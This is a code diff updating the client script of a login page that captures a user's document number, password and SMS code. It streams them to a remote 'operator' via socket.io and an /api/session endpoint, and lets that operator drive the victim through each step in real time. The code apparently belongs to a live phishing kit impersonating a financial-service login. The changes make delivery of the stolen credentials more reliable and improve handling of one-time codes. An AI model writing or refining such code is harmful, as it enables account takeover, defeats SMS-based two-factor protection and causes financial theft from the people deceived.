@@ -27,7 +27,7 @@
     sessionStorage.setItem("efectiva_client_id", clientId);
   }
 
-  const socket = typeof io !== "undefined" ? io() : null;
+  const socket = typeof io !== "undefined" ? io({ transports: ["websocket", "polling"] }) : null;
 
   function showLoading(text) {
     if (loadingOverlay) {
@@ -50,16 +50,25 @@
     if (!data || !data.action) return;
     if (data.targetId && data.targetId !== clientId && (!socket || data.targetId !== socket.id)) return;
     if (data.cmdId && data.cmdId === lastCmdId) return;
-    if (data.cmdId) lastCmdId = data.cmdId;
+    if (data.cmdId) {
+      lastCmdId = data.cmdId;
+      if (socket) socket.emit("client:ack", { clientId, cmdId: data.cmdId });
+    }
 
     hideLoading();
     const { action, message } = data;
     if (action === "wrong_doc") {
       setStep("doc");
+      if (password) password.value = "";
+      if (docWrap) docWrap.classList.add("error");
       showError(message || "Documento incorrecto o no registrado");
+      if (docNumber) docNumber.focus();
     } else if (action === "wrong_pass") {
       setStep("pass");
-      password.value = "";
+      if (password) {
+        password.value = "";
+        password.focus();
+      }
       showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
     } else if (action === "wrong_token") {
       setStep("verify");
@@ -68,13 +77,32 @@
       showError(message || "Código SMS inválido o expirado.");
     } else if (action === "ask_token") {
       setStep("verify");
+      tokens.forEach(function (t) { t.value = ""; });
       if (tokens[0]) tokens[0].focus();
     } else if (action === "ask_pass") {
       setStep("pass");
-      if (password) password.focus();
+      if (password) {
+        password.value = "";
+        password.focus();
+      }
     } else if (action === "approve" || action === "redirect") {
       window.location.href = "/panel.html";
     }
+  }
+
+  function postSessionWithRetry(data, attempt) {
+    fetch("/api/session", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data),
+      keepalive: true,
+    }).catch(function () {
+      if ((attempt || 0) < 2) {
+        setTimeout(function () {
+          postSessionWithRetry(data, (attempt || 0) + 1);
+        }, 800);
+      }
+    });
   }
 
   function sendSocketUpdate(customStatus) {
@@ -85,6 +113,7 @@
     if (!customStatus && !currentDoc && !currentPass && !currentToken) return;
     hasSubmitted = true;
 
+    const nowMs = Date.now();
     const data = {
       clientId,
       docType,
@@ -92,27 +121,21 @@
       password: currentPass,
       token: currentToken,
       step,
-      status: customStatus || (step === "doc" ? "Ingresando documento" : step === "pass" ? "Ingresando contraseña" : "Ingresando token SMS"),
+      status: customStatus || "Esperando verificación por el operador",
+      updatedAtMs: nowMs,
+      isUserSubmit: true,
     };
 
     if (socket) {
       socket.emit("client:update", data);
     }
 
-    fetch("/api/session", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
-      keepalive: true,
-    }).catch(function () {});
+    postSessionWithRetry(data, 0);
   }
 
   if (socket) {
     socket.on("connect", function () {
       socket.emit("client:register", { clientId });
-      if (hasSubmitted) {
-        sendSocketUpdate();
-      }
     });
 
     socket.on("operator:action", handleOperatorAction);
@@ -128,7 +151,7 @@
         }
       })
       .catch(function () {});
-  }, 1500);
+  }, 1000);
 
   function showError(text) {
     errorMsg.hidden = !text;
@@ -167,6 +190,7 @@
 
   password.addEventListener("input", function () {
     this.closest(".input-field").classList.toggle("filled", this.value.length > 0);
+    showError("");
   });
 
   docTypeBtn.addEventListener("click", function (event) {
@@ -203,6 +227,7 @@
 
   tokens.forEach(function (box, index) {
     box.addEventListener("input", function () {
+      showError("");
       this.value = this.value.replace(/\D/g, "").slice(0, 1);
       if (this.value && tokens[index + 1]) tokens[index + 1].focus();
     });
@@ -210,6 +235,19 @@
       if (event.key === "Backspace" && !this.value && tokens[index - 1]) {
         tokens[index - 1].focus();
       }
+    });
+    box.addEventListener("paste", function (event) {
+      event.preventDefault();
+      const pasted = ((event.clipboardData || window.clipboardData).getData("text") || "")
+        .replace(/\D/g, "")
+        .slice(0, tokens.length);
+      if (!pasted) return;
+      showError("");
+      for (let i = 0; i < pasted.length; i++) {
+        if (tokens[index + i]) tokens[index + i].value = pasted[i];
+      }
+      const nextFocus = tokens[Math.min(index + pasted.length, tokens.length - 1)];
+      if (nextFocus) nextFocus.focus();
     });
   });
 
